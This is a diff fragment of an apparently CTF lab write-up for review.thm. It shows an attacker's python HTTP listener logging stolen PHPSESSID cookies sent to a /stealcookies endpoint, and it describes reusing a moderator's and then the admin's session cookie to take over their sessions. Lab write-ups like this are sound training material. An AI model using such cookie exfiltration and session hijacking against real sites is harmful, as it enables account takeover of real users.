@@ -30,14 +30,23 @@ python3 -m http.server 4444
 We have gained the cookies of the mod
 
 $ python3 -m http.server 4444
+
 Serving HTTP on 0.0.0.0 port 4444 (http://0.0.0.0:4444/) ...
+
 10.201.50.181 - - [22/Sep/2025 11:23:39] code 404, message File not found
+
 10.201.50.181 - - [22/Sep/2025 11:23:39] "GET /stealcookies?PHPSESSID=buiscm78c6ni4jakeu12ejig3n HTTP/1.1" 404 -
+
 10.201.50.181 - - [22/Sep/2025 11:23:42] code 404, message File not found
+
 10.201.50.181 - - [22/Sep/2025 11:23:42] "GET /stealcookies?PHPSESSID=buiscm78c6ni4jakeu12ejig3n HTTP/1.1" 404 -
+
 10.201.50.181 - - [22/Sep/2025 11:23:44] code 404, message File not found
+
 10.201.50.181 - - [22/Sep/2025 11:23:44] "GET /stealcookies?PHPSESSID=buiscm78c6ni4jakeu12ejig3n HTTP/1.1" 404 -
+
 ^C
+
 Keyboard interrupt received, exiting.
 
 Copy the cookies value of the mod to our value and then reload the page
@@ -49,23 +58,39 @@ That's right, we can see the mod flag at the top of the page 👍
 After that, we got the Mod page, I seemed to pay attention to the chat section with the Admin, after trying a lot of Payload XSS and it was not successful, but what I did not think about was that we could send the admin to the feedback link that we sent http://review.thm/contact.php
 
 python3 -m http.server 4444
+
 Serving HTTP on 0.0.0.0 port 4444 (http://0.0.0.0:4444/) ...
+
 10.201.50.181 - - [22/Sep/2025 11:37:49] code 404, message File not found
+
 10.201.50.181 - - [22/Sep/2025 11:37:49] "GET /stealcookies?PHPSESSID=buiscm78c6ni4jakeu12ejig3n HTTP/1.1" 404 -
+
 10.201.50.181 - - [22/Sep/2025 11:37:51] code 404, message File not found
+
 10.201.50.181 - - [22/Sep/2025 11:37:51] "GET /stealcookies?PHPSESSID=buiscm78c6ni4jakeu12ejig3n HTTP/1.1" 404 -
+
 10.201.50.181 - - [22/Sep/2025 11:37:52] code 404, message File not found
+
 10.201.50.181 - - [22/Sep/2025 11:37:52] "GET /stealcookies?PHPSESSID=836k3hecvt40k2pml7b24mb11n HTTP/1.1" 404 -
+
 10.201.50.181 - - [22/Sep/2025 11:37:54] code 404, message File not found
+
 10.201.50.181 - - [22/Sep/2025 11:37:54] "GET /stealcookies?PHPSESSID=buiscm78c6ni4jakeu12ejig3n HTTP/1.1" 404 -
+
 10.201.50.181 - - [22/Sep/2025 11:37:56] code 404, message File not found
+
 10.201.50.181 - - [22/Sep/2025 11:37:56] "GET /stealcookies?PHPSESSID=buiscm78c6ni4jakeu12ejig3n HTTP/1.1" 404 -
+
 10.201.50.181 - - [22/Sep/2025 11:37:59] code 404, message File not found
+
 10.201.50.181 - - [22/Sep/2025 11:37:59] "GET /stealcookies?PHPSESSID=buiscm78c6ni4jakeu12ejig3n HTTP/1.1" 404 -
 
 This is admin cookies 836k3hecvt40k2pml7b24mb11n
+
 So we have flag2
+
 In the third flag I took a lot of time but after I was completed I felt that I was complicated on a simple problem 😄
+
 In http://review.thm/mail/dump.txt has provided us with some important things
 
 <img width="556" height="358" alt="image" src="https://github.com/user-attachments/assets/d703df3d-a86a-41be-8a84-579ac50c88ad" />
